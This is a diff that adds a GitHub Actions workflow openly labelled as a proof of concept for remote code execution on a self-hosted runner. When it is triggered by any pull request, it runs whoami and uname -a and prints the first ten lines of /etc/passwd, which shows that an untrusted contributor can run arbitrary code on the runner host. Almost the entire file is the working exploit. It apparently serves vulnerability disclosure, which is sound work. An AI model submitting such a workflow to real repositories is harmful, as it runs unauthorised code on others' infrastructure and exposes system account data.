@@ -1,0 +1,17 @@
+name: PoC — Self-Hosted Runner RCE
+
+on:
+  pull_request:
+
+jobs:
+  poc-rce:
+    runs-on: self-hosted
+
+    steps:
+      - name: Proof of Code Execution on Self-Hosted Runner
+        run: |
+          echo "✅ Arbitrary code execution proof"
+          echo "[whoami] $(whoami)"
+          echo "[kernel] $(uname -a)"
+          echo "[/etc/passwd preview]"
+          head -n 10 /etc/passwd
